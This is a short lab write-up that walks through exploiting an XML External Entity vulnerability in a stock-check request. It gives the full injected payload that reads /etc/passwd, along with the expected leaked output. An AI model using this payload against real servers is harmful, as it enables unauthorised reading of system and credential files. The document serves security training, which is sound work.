**LAB 1**
### Writeup: Exploiting XXE to Read the `/etc/passwd` File

---

#### **Objective**:
To demonstrate how an **XML External Entity (XXE)** vulnerability can be exploited to read sensitive files on a server, such as the `/etc/passwd` file, by manipulating an XML request.

---

#### **Steps**:

1. **Visit the Product Page**:
   - Navigate to the target website and visit a product page.
   - Look for a feature like "Check stock" or any functionality that triggers a request to check product availability.

2. **Intercept the Request**:
   - Open **Burp Suite** and configure your browser to route traffic through it.
   - Click the "Check stock" button on the product page.
   - In Burp Suite, intercept the resulting **POST request** in the **Proxy** tab.

3. **Analyze the Request**:
   - Observe that the request contains XML data, likely in the body of the POST request. For example:
     ```xml
     <?xml version="1.0" encoding="UTF-8"?>
     <stockCheck>
         <productId>123</productId>
         <storeId>1</storeId>
     </stockCheck>
     ```

4. **Inject the External Entity Definition**:
   - Insert an external entity definition between the XML declaration and the `stockCheck` element. For example:
     ```xml
     <?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
     <stockCheck>
         <productId>&xxe;</productId>
         <storeId>1</storeId>
     </stockCheck>
     ```
   - Here, the `xxe` entity is defined to load the contents of the `/etc/passwd` file from the server.

5. **Replace the `productId` with the Entity Reference**:
   - Replace the numeric value of `productId` with a reference to the external entity (`&xxe;`). This will cause the server to replace `&xxe;` with the contents of the `/etc/passwd` file when parsing the XML.

6. **Forward the Request**:
   - Forward the modified request in Burp Suite and observe the server's response.

---

#### **Expected Result**:
- The server processes the malicious XML and attempts to resolve the `xxe` entity by reading the `/etc/passwd` file.
- The response will likely contain an error message like:
  ```
  Invalid product ID: root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  ...
  ```
- This output confirms that the server has successfully read and returned the contents of the `/etc/passwd` file, demonstrating the XXE vulnerability.

---
